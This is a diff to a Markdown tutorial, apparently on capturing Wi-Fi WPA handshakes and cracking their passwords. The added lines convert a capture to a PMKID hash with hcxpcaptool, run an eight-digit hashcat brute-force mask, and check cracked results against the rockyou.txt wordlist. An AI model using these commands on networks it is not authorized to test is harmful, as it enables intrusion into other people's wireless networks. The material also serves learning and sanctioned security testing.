@@ -58,6 +58,8 @@ Open terminal.....
 
 6. Capture handshake : it will be shown in the monitor if captured ! at **Terminal-2**.
 
+   ![Captured handshake](images/handshake_captured.png)
+
 7. Now you got the handshake **(terminal-2)**
 8. Stop the process of terminal-2 : `ctrl+c`
 
@@ -75,7 +77,11 @@ or
 
     ![cap to hcappx](images/capToHccapx.png)
 
-2.  Crack password using **hashcat** :
+    **Note :** cap to pkid (in case of pkid) :
+
+    > hcxpcaptool -z pmkidhash suva-01.cap
+
+1.  Crack password using **hashcat** :
 
     - **Install hashcat :** `sudo apt install hashcat`
     - check is everything oky ? : `hashcat -I` **to use hashcat you need gpu**
@@ -90,6 +96,16 @@ or
 
       ![Hashcat Status](images/hashcat_status.png)
 
-Then you will get the password.
+- Bruteforce :
+  Example (bruteforce for length 8 password using 0-9 digits) :
 
-![password](images/pass.png)
+  > hashcat -a 3 -m 16800 pmkidhash ?d?d?d?d?d?d?d?d
+
+  Then you will get the password (if you are lucky enough).
+  ![password](images/pass.png)
+  here password : secret
+
+- Others :
+  All ready cracked pass check :
+
+  > hashcat -m 2500 test.hccapx rockyou.txt --show
